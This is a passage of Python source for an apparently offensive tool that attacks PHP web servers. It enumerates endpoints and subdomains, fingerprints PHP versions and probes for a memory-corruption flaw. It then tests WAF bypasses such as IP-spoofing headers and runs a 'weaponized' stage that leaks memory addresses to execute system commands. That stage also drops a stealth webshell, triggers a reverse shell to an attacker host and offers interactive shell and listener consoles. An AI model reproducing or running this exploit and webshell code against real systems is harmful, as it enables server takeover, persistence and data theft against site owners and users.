                sm = self.session.get(f"{base}{sm_path}", timeout=self.timeout, allow_redirects=False)
                if sm.status_code == 200:
                    urls = re.findall(r"<loc>\s*(https?://[^<]+\.php[^<]*)\s*</loc>", sm.text)
                    for u in urls[:50]:
                        result.sitemap_paths.append(urlparse(u).path)
            except Exception:
                pass

        # Endpoint Discovery via Enhanced Wordlist
        base_wordlist = custom_endpoints if custom_endpoints is not None else UNIFIED_PHP_ENDPOINTS
        endpoints_to_probe = list(dict.fromkeys(base_wordlist + result.robots_paths + result.sitemap_paths))
        if max_endpoints and len(endpoints_to_probe) > max_endpoints:
            endpoints_to_probe = endpoints_to_probe[:max_endpoints]
        for ep_path in endpoints_to_probe:
            url = f"{base}{ep_path}"
            t0 = time.monotonic()
            try:
                head_resp = self.session.head(url, timeout=self.timeout, allow_redirects=True)
                elapsed = time.monotonic() - t0
                if head_resp.status_code == 405:
                    head_resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                    elapsed = time.monotonic() - t0

                if head_resp.status_code not in (404, 410):
                    is_upload = any(k in ep_path.lower() for k in ("upload", "file", "media", "attach"))
                    ep_obj = PHPEndpoint(
                        url=url,
                        status_code=head_resp.status_code,
                        content_length=int(head_resp.headers.get("Content-Length", 0)),
                        response_time=round(elapsed, 3),
                        is_upload_endpoint=is_upload,
                        accepts_multipart="POST" in head_resp.headers.get("Allow", "").upper() or is_upload,
                    )
                    result.php_endpoints.append(ep_obj)
                    if self.verbose:
                        tag = " [UPLOAD]" if is_upload else ""
                        self.progress("  └─ Found:", f"{url} (HTTP {head_resp.status_code}){tag}", Fore.BLUE)
            except Exception:
                continue

        # Optional Subdomains via crt.sh
        if subdomain_enum:
            domain = urlparse(base).netloc.split(":")[0]
            try:
                ct = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=20)
                if ct.status_code == 200:
                    for entry in ct.json():
                        for sub in entry.get("name_value", "").splitlines():
                            sub = sub.strip().lstrip("*.")
                            if sub and sub not in result.subdomains:
                                result.subdomains.append(sub)
                    self.progress("  └─ CT Logs:", f"Discovered {len(result.subdomains)} subdomains", Fore.BLUE)
            except Exception:
                pass

        self.progress("[1/5 RECON]", f"Complete: {len(result.php_endpoints)} endpoints, {len(result.waf_detected)} WAFs.", Fore.GREEN)
        return result

    # -----------------------------------------------------------------------
    # STAGE 2: Passive Fingerprinting (SINGLE SHARED REQUEST - NO DUPLICATE GET)
    # -----------------------------------------------------------------------
    def run_passive(self, target: str, endpoint: Optional[str] = None) -> Tuple[VersionResult, HeaderAnalysis]:
        self.progress("[2/5 PASSIVE]", f"Auditing PHP version & runtime state: {target}")
        vr = VersionResult()
        ha = HeaderAnalysis(target=target)

        # SINGLE HTTP GET used for both version determination and header analysis
        try:
            resp = self.session.get(target, timeout=self.timeout, allow_redirects=True)
        except Exception as e:
            ha.error = str(e)
            vr.detail = f"Connection failed: {e}"
            self.progress("[2/5 PASSIVE]", f"Connection failed: {e}", Fore.RED)
            return vr, ha

        # Populate HeaderAnalysis
        ha.is_php = False
        powered_by = resp.headers.get("X-Powered-By", "")
        server_hdr = resp.headers.get("Server", "")
        ha.x_powered_by = powered_by or None
        ha.server_header = server_hdr or None

        if "PHP" in powered_by.upper():
            ha.is_php = True
            ha.evidence.append(f"X-Powered-By: {powered_by}")
        if re.search(r"PHP[/ ]\d", server_hdr, re.I):
            ha.is_php = True
            ha.evidence.append(f"Server header: {server_hdr}")

        for cookie in resp.cookies:
            if cookie.name.upper() == "PHPSESSID":
                ha.php_session_cookie = True
                ha.is_php = True
                ha.evidence.append("PHPSESSID cookie detected")
                break
        if "PHPSESSID" in resp.headers.get("Set-Cookie", "").upper():
            ha.php_session_cookie = True
            ha.is_php = True

        # Runtime mode
        combo = f"{server_hdr} {powered_by}".lower()
        if "fpm" in combo:
            ha.runtime_mode = PHPRuntime.PHP_FPM
        elif "mod_php" in combo or "apache2handler" in combo:
            ha.runtime_mode = PHPRuntime.MOD_PHP
        elif "litespeed" in combo:
            ha.runtime_mode = PHPRuntime.LITESPEED
        elif "cgi" in combo or "fastcgi" in combo:
            ha.runtime_mode = PHPRuntime.CGI

        # Extract Version String
        m_ver = re.search(r"PHP[/ ]?(\d+\.\d+\.\d+(?:-\w+)?)", powered_by, re.I)
        if m_ver:
            vr.version_string = m_ver.group(1)
            vr.source = "x-powered-by"
            vr.raw_header_value = powered_by
        else:
            m_srv = re.search(r"PHP[/ ]?(\d+\.\d+\.\d+(?:-\w+)?)", server_hdr, re.I)
            if m_srv:
                vr.version_string = m_srv.group(1)
                vr.source = "server-header"
                vr.raw_header_value = server_hdr

        # Probe phpinfo if headers gave nothing
        if not vr.version_string:
            base = target.rstrip("/")
            for pinfo in ["/phpinfo.php", "/info.php", "/php_info.php", "/test.php", "/test_info.php", "/i.php"]:
                try:
                    p_resp = self.session.get(urljoin(target, pinfo), timeout=self.timeout, allow_redirects=False)
                    if p_resp.status_code == 200:
                        m_p = re.search(r"PHP\s+Version\s*[:\s]*(\d+\.\d+\.\d+(?:-\w+)?)", p_resp.text, re.I)
                        if m_p:
                            vr.version_string = m_p.group(1)
                            vr.source = f"phpinfo ({pinfo})"
                            vr.phpinfo_exposed = True
                            ha.is_php = True
                            break
                except Exception:
                    pass

        # If version not found and a discovered endpoint exists, query it as well
        if not vr.version_string and endpoint and endpoint != target:
            try:
                ep_resp = self.session.get(endpoint, timeout=self.timeout, allow_redirects=True)
                ep_pb = ep_resp.headers.get("X-Powered-By", "")
                ep_srv = ep_resp.headers.get("Server", "")
                m_ep_ver = re.search(r"PHP[/ ]?(\d+\.\d+\.\d+(?:-\w+)?)", f"{ep_pb} {ep_srv}", re.I)
                if m_ep_ver:
                    vr.version_string = m_ep_ver.group(1)
                    vr.source = f"endpoint-header ({endpoint})"
                    ha.is_php = True
            except Exception:
                pass

        # Evaluate Version against Advisory Thresholds
        if vr.version_string:
            vr.version_tuple = parse_php_version(vr.version_string)
            if vr.version_tuple:
                maj, minor, patch = vr.version_tuple
                if (maj, minor) < (5, 4):
                    vr.status = VulnerabilityStatus.UNKNOWN
                    vr.detail = "Version predates the documented affected range; review manually."
                elif (maj, minor) < (8, 2):
                    vr.status = VulnerabilityStatus.VULNERABLE_EOL
                    vr.applicable_cves = list(TRACKED_CVES)
                    vr.detail = (
                        f"PHP {vr.version_string} is an older upstream branch in the affected range. "
                        "Check vendor security backports before confirming exposure."
                    )
                else:
                    patched = PATCHED_VERSIONS.get((maj, minor))
                    if patched is None:
                        vr.status = VulnerabilityStatus.UNKNOWN
                        vr.detail = "This PHP branch is not in the maintained version table; review manually."
                    elif vr.version_tuple < patched:
                        vr.status = VulnerabilityStatus.VULNERABLE
                        vr.applicable_cves = list(TRACKED_CVES)
                        vr.detail = (
                            f"Upstream PHP {vr.version_string} < fixed {'.'.join(str(x) for x in patched)}. "
                            "Verify vendor backports before treating header evidence as proof."
                        )
                    else:
                        vr.status = VulnerabilityStatus.PATCHED
                        vr.detail = (
                            f"PHP {vr.version_string} meets upstream version threshold; "
                            "confirm the serving runtime and package origin."
                        )

        # The standalone Python fixture only imitates PHP response headers. It
        # cannot demonstrate actual PHP memory corruption or patch effectiveness.
        if resp.headers.get("X-PHP2Shell-Lab", "").lower() == "standalone-fixture":
            vr.status = VulnerabilityStatus.UNKNOWN
            vr.applicable_cves = []
            vr.detail = "Synthetic Python lab fixture: fingerprint-only, not a vulnerability test."

        status_col = Fore.RED if vr.status in (VulnerabilityStatus.VULNERABLE, VulnerabilityStatus.VULNERABLE_EOL) else Fore.GREEN
        ver_display = vr.version_string or "Unknown"
        self.progress("[2/5 PASSIVE]", f"PHP: {ver_display} | SAPI: {ha.runtime_mode.value} | Status: {status_col}{vr.status.value}", Fore.GREEN)
        return vr, ha

    # -----------------------------------------------------------------------
    # STAGE 3: Active Behavioral Probes
    # -----------------------------------------------------------------------
    def run_active_probes(
        self,
        target: str,
        endpoint: Optional[str] = None,
        alternative_endpoints: Optional[List[str]] = None,
    ) -> ProbeResult:
        candidate_eps = []
        if endpoint:
            candidate_eps.append(endpoint)
        if alternative_endpoints:
            for a_ep in alternative_endpoints:
                if a_ep not in candidate_eps:
                    candidate_eps.append(a_ep)
        if not candidate_eps:
            candidate_eps.append(target)

        ep = candidate_eps[0]
        self.progress("[3/5 ACTIVE]", f"Dispatching differential OOM & UAF probes to: {ep}")
        pr = ProbeResult(target=target)

        # Baseline Control with fallback across candidate endpoints
        b_ctrl = b"----PHP2ShellControl"
        ctrl_body = b"--" + b_ctrl + b"\r\nContent-Disposition: form-data; name=\"ctrl\"\r\n\r\n1\r\n--" + b_ctrl + b"--\r\n"
        ctrl_status = None
        ctrl_time = None

        for test_ep in candidate_eps:
            t0 = time.monotonic()
            try:
                c_resp = self.session.post(
                    test_ep,
                    data=ctrl_body,
                    headers={"Content-Type": "multipart/form-data; boundary=" + b_ctrl.decode()},
                    timeout=self.timeout,
                )
                if c_resp.status_code not in (404, 410):
                    ep = test_ep
                    ctrl_status = c_resp.status_code
                    ctrl_time = time.monotonic() - t0
                    break
            except Exception:
                continue

        if ctrl_status is None:
            # Fallback to direct target
            ep = target
            t0 = time.monotonic()
            try:
                c_resp = self.session.post(
                    ep,
                    data=ctrl_body,
                    headers={"Content-Type": "multipart/form-data; boundary=" + b_ctrl.decode()},
                    timeout=self.timeout,
                )
                ctrl_status = c_resp.status_code
                ctrl_time = time.monotonic() - t0
            except Exception as e:
                pr.outcome = ProbeOutcome.ERROR
                pr.detail = f"Control request failed across all discovered endpoints: {e}"
                self.progress("[3/5 ACTIVE]", f"Control failed: {e}", Fore.RED)
                return pr

        pr.probes_run += 1
        self.progress("  └─ Baseline:", f"HTTP {ctrl_status} ({ctrl_time:.2f}s) on {ep}", Fore.BLUE)

        # Probe 1: Nested Array 62-level (OOM / uninitialized memory corruption)
        b_nest = b"----PHP2ShellNestedProbe"
        key = "field" + "[a]" * 62
        nest_parts = [{"name": key, "data": "A" * 2048}]
        nest_body = build_multipart_payload(nest_parts, b_nest)
        t0 = time.monotonic()
        try:
            n_resp = self.session.post(ep, data=nest_body, headers={"Content-Type": "multipart/form-data; boundary=" + b_nest.decode()}, timeout=self.timeout)
            n_time = time.monotonic() - t0
            pr.probes_run += 1
            oom_sig = any(sig in n_resp.text.lower() for sig in ("allowed memory size of", "bytes exhausted", "zend_mm_heap corrupted", "zend_bailout"))
            diff = n_resp.status_code in (500, 502, 503) or (n_time - ctrl_time > 3.0) or oom_sig
            note = "OOM memory exhaustion signature matched" if oom_sig else None
            pr.evidence.append(ProbeEvidence(probe_name="nested_array_62", control_status=ctrl_status, probe_status=n_resp.status_code, probe_time=n_time, differential_flag=diff, note=note))
            self.progress("  └─ Nested Array Probe:", f"HTTP {n_resp.status_code} (diff={diff}{', OOM sig matched' if oom_sig else ''})", Fore.YELLOW if diff else Fore.BLUE)
        except requests.Timeout:
            pr.probes_run += 1
            pr.evidence.append(ProbeEvidence(probe_name="nested_array_62", differential_flag=True, note="Timeout/Crash"))
            self.progress("  └─ Nested Array Probe:", "Timeout (Likely Worker Crash)", Fore.RED)
        except Exception as e:
            pr.evidence.append(ProbeEvidence(probe_name="nested_array_62", note=str(e)))

        # Probe 2: Upload Progress Vector (CVE-2026-109619 UAF)
        b_up = b"----PHP2ShellUploadProbe"
        up_parts = [
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "probe_pwn"},
            {"name": "file", "filename": "test.php", "data": b"PROBE_BYTES_" + os.urandom(8)}
        ]
        up_body = build_multipart_payload(up_parts, b_up)
        t0 = time.monotonic()
        try:
            u_resp = self.session.post(ep, data=up_body, headers={"Content-Type": "multipart/form-data; boundary=" + b_up.decode()}, timeout=self.timeout)
            u_time = time.monotonic() - t0
            pr.probes_run += 1
            uaf_sig = any(sig in u_resp.text.lower() for sig in ("allowed memory size of", "bytes exhausted", "zend_mm_heap corrupted", "zend_bailout"))
            diff_u = u_resp.status_code in (500, 502, 503) or (u_time - ctrl_time > 3.0) or uaf_sig
            note_u = "OOM/UAF signature matched" if uaf_sig else None
            pr.evidence.append(ProbeEvidence(probe_name="upload_progress", control_status=ctrl_status, probe_status=u_resp.status_code, probe_time=u_time, differential_flag=diff_u, note=note_u))
            self.progress("  └─ Upload Progress Probe:", f"HTTP {u_resp.status_code} (diff={diff_u}{', OOM/UAF sig matched' if uaf_sig else ''})", Fore.YELLOW if diff_u else Fore.BLUE)
        except requests.Timeout:
            pr.probes_run += 1
            pr.evidence.append(ProbeEvidence(probe_name="upload_progress", differential_flag=True, note="Timeout/Crash"))
            self.progress("  └─ Upload Progress Probe:", "Timeout (Likely Worker UAF)", Fore.RED)
        except Exception as e:
            pr.evidence.append(ProbeEvidence(probe_name="upload_progress", note=str(e)))

        # Differential Evaluation
        diffs = [e for e in pr.evidence if e.differential_flag]
        if len(diffs) >= 2:
            pr.outcome = ProbeOutcome.LIKELY_VULNERABLE
            pr.detail = f"High confidence: {len(diffs)} differential probe responses."
        elif len(diffs) == 1:
            pr.outcome = ProbeOutcome.INCONCLUSIVE
            pr.detail = "Single differential response observed."
        else:
            pr.outcome = ProbeOutcome.LIKELY_PATCHED
            pr.detail = "All probes returned uniform non-crashing baseline responses."

        out_col = Fore.RED if pr.outcome == ProbeOutcome.LIKELY_VULNERABLE else Fore.GREEN
        self.progress("[3/5 ACTIVE]", f"Outcome: {out_col}{pr.outcome.value} ({pr.detail})", Fore.GREEN)
        return pr

    # -----------------------------------------------------------------------
    # STAGE 4: WAF Evasion Analysis
    # -----------------------------------------------------------------------
    def run_waf_analysis(self, target: str, endpoint: Optional[str] = None) -> WAFAnalysis:
        ep = endpoint or target
        self.progress("[4/5 WAF]", f"Assessing WAF evasion & bypass vectors: {ep}")
        wa = WAFAnalysis(target=ep)

        # Baseline GET
        try:
            r = self.session.get(ep, timeout=self.timeout)
            hdr_str = " ".join(f"{k}={v}" for k, v in r.headers.items()).lower()
            for wname, sigs in UNIFIED_WAF_SIGNATURES.items():
                if any(s in hdr_str for s in sigs):
                    wa.waf_name = wname
                    break
        except Exception:
            pass

        # Test Vectors: Chunked Encoding, Boundary Variation, IP Spoof
        tests = [
            ("chunked_transfer", {"Transfer-Encoding": "chunked"}, "chunked Transfer-Encoding"),
            ("boundary_variation", {"Content-Type": "multipart/form-data; boundary=----=_Part_99_P2S"}, "unusual multipart boundary"),
            ("ip_spoof_headers", {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, "X-Forwarded-For IP spoofing"),
        ]

        bndry = b"----PHP2ShellWAFTest"
        body = build_multipart_payload([{"name": "field[a][a]", "data": "A" * 512}], bndry)

        for tname, hdrs, label in tests:
            hdrs_full = {"Content-Type": f"multipart/form-data; boundary={bndry.decode()}", **hdrs}
            t0 = time.monotonic()
            try:
                res = self.session.post(ep, data=body, headers=hdrs_full, timeout=self.timeout)
                elapsed = time.monotonic() - t0
                blocked = res.status_code in (400, 403, 406, 429)
                behav = WAFBehaviour.BLOCKS if blocked else WAFBehaviour.PASSES
                wa.tests.append(WAFTestResult(test_name=tname, behaviour=behav, http_status=res.status_code, latency=round(elapsed, 3)))
                if behav == WAFBehaviour.PASSES:
                    wa.bypass_vectors.append(label)
                    self.progress("  └─ Test:", f"{label} -> PASSED (HTTP {res.status_code})", Fore.GREEN)
                else:
                    self.progress("  └─ Test:", f"{label} -> BLOCKED (HTTP {res.status_code})", Fore.YELLOW)
            except Exception as e:
                wa.tests.append(WAFTestResult(test_name=tname, note=str(e)))

        blocks = sum(1 for t in wa.tests if t.behaviour == WAFBehaviour.BLOCKS)
        passes = sum(1 for t in wa.tests if t.behaviour == WAFBehaviour.PASSES)
        wa.blocks_probes = blocks > passes
        wa.summary = f"WAF: {wa.waf_name or 'None'} | Bypasses confirmed: {len(wa.bypass_vectors)}"
        self.progress("[4/5 WAF]", wa.summary, Fore.GREEN)
        return wa

    # -----------------------------------------------------------------------
    # STAGE 5: Weaponized Exploitation (Exploit-DB #52704 & Webshell Dropper)
    # -----------------------------------------------------------------------
    def run_exploit(
        self,
        target: str,
        endpoint: Optional[str] = None,
        alternative_endpoints: Optional[List[str]] = None,
        method: str = "auto",
        profile: str = "bookworm",
        cmd: str = "id; whoami; uname -a",
        carrier_trigger: Optional[str] = None,
        webshell_name: str = DEFAULT_WEBSHELL_NAME,
        spawn_reverse: bool = False,
        lhost: Optional[str] = None,
        lport: int = 4444,
        zif_offset: Optional[int] = None,
        dtor_offset: Optional[int] = None,
        htdata_offset: Optional[int] = None,
        proof_file: Optional[str] = None,
        fetch_path: Optional[str] = None,
        huge_mb: int = 12,
        retries: int = 3,
    ) -> ExploitResult:
        ep = endpoint or target
        self.progress("[5/5 EXPLOIT]", f"Executing weaponized kill-chain against: {ep}", Fore.RED)
        res = ExploitResult(target=target)

        # -------------------------------------------------------------------
        # Path A: Exploit-DB #52704 Binary Leak & zif_system Execution
        # -------------------------------------------------------------------
        if method in ("auto", "binary", "52704", "exploitdb"):
            self.progress("  └─ [Exploit-DB #52704]", f"Starting memory corruption chain (profile={profile})...", Fore.YELLOW)
            try:
                target_cmd = cmd.strip()
                if spawn_reverse and lhost:
                    target_cmd = generate_reverse_shell_cmd(lhost, lport)
                elif proof_file and proof_file not in target_cmd:
                    target_cmd = f"({target_cmd}) > {proof_file} 2>&1"

                try:
                    cmd_bytes = target_cmd.encode("latin1")
                except UnicodeEncodeError:
                    res.status = ExploitStatus.ERROR
                    res.details = "Command cannot be represented in Latin-1 encoding."
                    return res

                # Automatic payload staging if command exceeds MAX_CMD_LEN (14 bytes)
                staged_payload = None
                if len(cmd_bytes) <= MAX_CMD_LEN and not carrier_trigger:
                    carrier_cmd = target_cmd
                else:
                    trigger = carrier_trigger or DEFAULT_STAGED_TRIGGER
                    trigger_bytes = trigger.strip().encode("latin1")
                    if len(trigger_bytes) > MAX_CMD_LEN:
                        res.status = ExploitStatus.ERROR
                        res.details = f"Trigger command ({len(trigger_bytes)}B) exceeds carrier limit ({MAX_CMD_LEN}B)."
                        self.progress("  └─ [Exploit-DB #52704]", res.details, Fore.YELLOW)
                        return res
                    carrier_cmd = trigger.strip()
                    staged_payload = b"#!/bin/sh\n" + cmd_bytes + b"\n"
                    self.progress(
                        "  └─ [Auto-Staging]:",
                        f"Command ({len(cmd_bytes)}B > {MAX_CMD_LEN}B limit) automatically staged via multipart upload -> trigger: '{carrier_cmd}'",
                        Fore.CYAN,
                    )

                raw_tgt = RawHttpTarget(ep, timeout=float(self.timeout), verbose=False)
                engine_52704 = ExploitDB52704Engine(
                    target=raw_tgt,
                    cmd=carrier_cmd,
                    zif_offset=zif_offset or DEFAULT_ZIF_OFFSET,
                    dtor_offset=dtor_offset or DEFAULT_DTOR_OFFSET,
                    htdata_offset=htdata_offset,
                    huge_mb=huge_mb,
                    profile=profile,
                    staged_payload=staged_payload,
                )

                # A pre-existing local file is not evidence of this exploit attempt.
                proof_before = None
                if proof_file:
                    try:
                        proof_stat = os.stat(proof_file)
                        proof_before = (proof_stat.st_mtime_ns, proof_stat.st_size)
                    except OSError:
                        pass

                fetch_before = None
                if fetch_path:
                    try:
                        st_b, body_b = raw_tgt.get(fetch_path)
                        fetch_before = (st_b, body_b)
                    except Exception:
                        pass

                self.progress("  └─ Stage 0:", "Rotating worker process over HTTP...", Fore.BLUE)
                engine_52704.rotate()

                chunk = 0
                for a in range(1, retries + 1):
                    self.progress("  └─ Stage 1:", f"Heap leak attempt {a}/{retries}...", Fore.BLUE)
                    chunk = engine_52704.stage1()
                    if chunk:
                        self.progress("  └─ [Heap Leak]:", f"Zend MM chunk base: 0x{chunk:x}", Fore.GREEN)
                        break
                    engine_52704.rotate()

                if chunk:
                    engine_52704.rotate()
                    libphp = 0
                    for a in range(1, retries + 1):
                        self.progress("  └─ Stage 2:", f"LibPHP leak attempt {a}/{retries}...", Fore.BLUE)
                        libphp = engine_52704.stage2()
                        if libphp:
                            self.progress("  └─ [LibPHP Leak]:", f"libphp base: 0x{libphp:x}", Fore.GREEN)
                            break
                        engine_52704.rotate()

                    if libphp:
                        engine_52704.rotate()
                        htdata = chunk + (htdata_offset or (BOOKWORM_HTDATA_OFFSET if profile == "bookworm" else DEFAULT_HTDATA_OFFSET))
                        zif = libphp + (zif_offset or DEFAULT_ZIF_OFFSET)
                        self.progress("  └─ Stage 3:", f"Executing zif_system (HTDATA=0x{htdata:x}, ZIF=0x{zif:x})...", Fore.MAGENTA)

                        for a in range(1, retries + 2):
                            try:
                                engine_52704.stage3(htdata, zif)
                            except OSError:
                                pass
                            time.sleep(0.5)

                            if proof_file and proof_file_is_fresh(proof_file, proof_before):
                                with open(proof_file, "r", encoding="latin1") as pf:
                                    res.command_output = pf.read().strip()
                                    res.status = ExploitStatus.SUCCESS
                                    res.details = f"Exploit-DB 52704 execution confirmed via {proof_file}"
                                    self.progress("  └─ [SUCCESS]:", f"Proof confirmed: {res.command_output}", Fore.GREEN)
                                    return res

                            if fetch_path:
                                st, body = raw_tgt.get(fetch_path)
                                body_text = body.decode("latin1", errors="replace").strip() if body else ""
                                is_fresh_fetch = (fetch_before is None or fetch_before[0] != 200 or body != fetch_before[1])
                                if st == 200 and body_text and is_fresh_fetch:
                                    res.status = ExploitStatus.SUCCESS
                                    res.command_output = body_text
                                    res.details = f"Execution confirmed via HTTP GET {fetch_path}"
                                    self.progress("  └─ [SUCCESS]:", f"Proof confirmed via {fetch_path}: {res.command_output[:100]}", Fore.GREEN)
                                    return res

                            engine_52704.rotate()

                        res.status = ExploitStatus.UNCONFIRMED
                        res.command_output = None
                        res.details = (
                            "Requests were sent, but no independently verified execution evidence "
                            "was obtained. Do not report this as a confirmed compromise."
                        )
                        self.progress("  └─ [Exploit-DB #52704]:", "Dispatch unconfirmed; no proof of execution.", Fore.YELLOW)
                        if method != "auto":
                            return res

            except Exception as e:
                self.progress("  └─ [Exploit-DB #52704]:", f"Notice: {e}", Fore.YELLOW)
                if method != "auto":
                    res.status = ExploitStatus.ERROR
                    res.details = f"Binary chain failed: {e}"
                    return res

            if method == "auto":
                self.progress("  └─ [Auto-Chain Fallback]:", "Binary stage unconfirmed; proceeding to multipart webshell persistence...", Fore.YELLOW)

        # -------------------------------------------------------------------
        # Path B: Multipart OOM / UAF Webshell Persistence Dropper
        # -------------------------------------------------------------------
        self.progress("  └─ [Webshell Dropper]", "Engaging multipart OOM & UAF persistence dropper...", Fore.YELLOW)
        ws_code, param = generate_stealth_webshell()
        bndry = b"---------------------------PHP2ShellUnified" + "".join(random.choices(string.digits, k=10)).encode()
        key = "p2s" + "[a]" * 62
        parts = [
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "p2s_unified_session"},
            {"name": "uninit_file", "data": ws_code},
            {"name": key, "data": "A" * 1024},
            {"name": "shell", "filename": webshell_name, "data": ws_code},
        ]
        body = build_multipart_payload(parts, bndry)

        try:
            self.session.post(ep, data=body, headers={"Content-Type": "multipart/form-data; boundary=" + bndry.decode(), "Connection": "keep-alive"}, timeout=self.timeout)
        except Exception:
            pass

        # Check drop candidates
        base = target.rstrip("/")
        candidates = [f"{base}/{webshell_name}"]
        for p in TARGET_WRITABLE_PATHS:
            p_clean = p.strip("/")
            if p_clean and p_clean != ".":
                candidates.append(f"{base}/{p_clean}/{webshell_name}")

        live_shell = None
        for cand in candidates:
            try:
                chk = self.session.post(cand, data={param: "echo 'P2S_VERIFIED';"}, timeout=3)
                if "P2S_VERIFIED" in chk.text:
                    live_shell = cand
                    break
            except Exception:
                continue

        # If first attempt didn't drop webshell, try alternative discovered endpoints
        if not live_shell and alternative_endpoints:
            for alt_ep in alternative_endpoints:
                if alt_ep == ep:
                    continue
                try:
                    self.session.post(
                        alt_ep,
                        data=body,
                        headers={"Content-Type": "multipart/form-data; boundary=" + bndry.decode(), "Connection": "keep-alive"},
                        timeout=self.timeout,
                    )
                    for cand in candidates:
                        try:
                            chk = self.session.post(cand, data={param: "echo 'P2S_VERIFIED';"}, timeout=3)
                            if "P2S_VERIFIED" in chk.text:
                                live_shell = cand
                                break
                        except Exception:
                            continue
                    if live_shell:
                        self.progress("  └─ [Dropper Fallback]:", f"Webshell dropped via alternative endpoint: {alt_ep}", Fore.GREEN)
                        break
                except Exception:
                    continue

        if live_shell:
            res.status = ExploitStatus.WEBSHELL_DROPPED
            res.webshell_url = live_shell
            res.webshell_param = param
            self.progress("  └─ [WEBSHELL LIVE]:", f"{live_shell} (param: {param})", Fore.GREEN)

            # Command execution
            out = self.execute_webshell_cmd(live_shell, param, cmd)
            res.command_output = out
            self.progress("  └─ Command Output:", f"\n{out}", Fore.CYAN)

            # Optional Reverse Shell
            if spawn_reverse and lhost:
                self.progress("  └─ [Reverse Shell]:", f"Dispatching callback to {lhost}:{lport}...", Fore.MAGENTA)
                rev = generate_reverse_shell_cmd(lhost, lport)
                threading.Thread(target=self.execute_webshell_cmd, args=(live_shell, param, rev), daemon=True).start()
                # Dispatching a callback is not proof that a listener accepted it.
                res.reverse_shell_connected = False
                res.details = "Reverse shell callback requested, connection not independently verified."

            return res

        res.status = ExploitStatus.FAILED
        res.details = "Exploit payloads dispatched; webshell write could not be confirmed."
        self.progress("[5/5 EXPLOIT]", "Exploit dispatched (unconfirmed webshell verification).", Fore.YELLOW)
        return res

    def execute_webshell_cmd(self, shell_url: str, param: str, command: str) -> str:
        try:
            r = self.session.post(shell_url, data={param: command}, timeout=self.timeout)
            t = r.text
            if PAYLOAD_DELIMITER_START in t and PAYLOAD_DELIMITER_END in t:
                return t.split(PAYLOAD_DELIMITER_START)[1].split(PAYLOAD_DELIMITER_END)[0].strip()
            return t.strip()
        except Exception as e:
            return f"Error: {e}"

    def launch_interactive_shell(self, shell_url: str, param: str = "cmd") -> None:
        print(f"\n{Fore.GREEN}[*] Dropping into interactive shell console at {shell_url}{Style.RESET_ALL}")
        print(f"[*] Persistent session active. Session will NOT close automatically.")
        print("[*] Type 'exit' or 'quit' to terminate session.\n")
        who = self.execute_webshell_cmd(shell_url, param, "whoami") or "www-data"
        host = self.execute_webshell_cmd(shell_url, param, "hostname") or "target"
        pwd = self.execute_webshell_cmd(shell_url, param, "pwd") or "/var/www/html"

        while True:
            try:
                cmd = input(f"{Fore.GREEN}{who}@{host}{Style.RESET_ALL}:{Fore.BLUE}{pwd}{Style.RESET_ALL}$ ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    print("[*] Interactive shell exited by user command.")
                    break
                if cmd.startswith("cd "):
                    new_dir = cmd[3:].strip()
                    npwd = self.execute_webshell_cmd(shell_url, param, f"cd {pwd} && cd {new_dir} && pwd")
                    if npwd and not npwd.startswith("Error"):
                        pwd = npwd
                    continue
                out = self.execute_webshell_cmd(shell_url, param, f"cd {pwd} && {cmd}")
                if out:
                    print(out)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Ctrl+C intercepted.{Style.RESET_ALL}")
                try:
                    confirm = input(f"{Fore.YELLOW}[?] Do you want to close this shell session? (y/N): {Style.RESET_ALL}").strip().lower()
                    if confirm == "y":
                        print("[*] Shell session closed by user consent.")
                        break
                    else:
                        print("[*] Shell session remaining active.")
                        continue
                except (KeyboardInterrupt, EOFError):
                    print("\n[*] Shell session remaining active.")
                    continue
            except EOFError:
                print("\n[*] Shell session closed.")
                break

    def launch_reverse_listener(
        self,
        lhost: str,
        lport: int,
        shell_url: Optional[str] = None,
        param: Optional[str] = None,
    ) -> None:
        """Starts a built-in interactive reverse shell listener that stays persistent and only closes with user consent."""
        print(f"\n{Fore.CYAN}[*] Starting built-in reverse shell listener on 0.0.0.0:{lport}...{Style.RESET_ALL}")
        bind_host = "0.0.0.0"
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server_sock.bind((bind_host, lport))
            server_sock.listen(1)
            server_sock.settimeout(60.0)
            print(f"{Fore.GREEN}[+] Listener waiting for reverse callback on port {lport} (timeout 60s)...{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Listener bind error on port {lport}: {e}{Style.RESET_ALL}")
            return

        # Trigger reverse shell payload if webshell is active
        if shell_url and param:
            rev_cmd = generate_reverse_shell_cmd(lhost, lport)
            threading.Thread(target=self.execute_webshell_cmd, args=(shell_url, param, rev_cmd), daemon=True).start()
            print(f"{Fore.MAGENTA}[*] Dispatched reverse shell payload to {lhost}:{lport} via webshell...{Style.RESET_ALL}")

        while True:
            try:
                client_sock, client_addr = server_sock.accept()
                print(f"\n{Fore.GREEN}[+++] REVERSE SHELL CONNECTED from {client_addr[0]}:{client_addr[1]}!{Style.RESET_ALL}")
                print(f"[*] Persistent reverse session established. Session will not terminate without consent.")
                print(f"[*] Type 'exit' to leave session.\n")

                stop_event = threading.Event()

                def _recv_loop():
                    while not stop_event.is_set():
                        try:
                            data = client_sock.recv(4096)
                            if not data:
                                break
                            sys.stdout.write(data.decode("latin1", errors="replace"))
                            sys.stdout.flush()
                        except (socket.timeout, OSError):
                            break
                    stop_event.set()

                reader_thread = threading.Thread(target=_recv_loop, daemon=True)
                reader_thread.start()

                while not stop_event.is_set():
                    try:
                        user_input = sys.stdin.readline()
                        if not user_input:
                            break
                        if user_input.strip().lower() in ("exit", "quit"):
                            client_sock.sendall(b"exit\n")
                            time.sleep(0.3)
                            break
                        client_sock.sendall(user_input.encode("latin1", errors="replace"))
                    except KeyboardInterrupt:
                        print(f"\n{Fore.YELLOW}[!] Ctrl+C intercepted.{Style.RESET_ALL}")
                        try:
                            confirm = input(f"{Fore.YELLOW}[?] Close reverse shell session? (y/N): {Style.RESET_ALL}").strip().lower()
                            if confirm == "y":
                                print("[*] Closing reverse shell session by user consent.")
                                stop_event.set()
                                break
                            else:
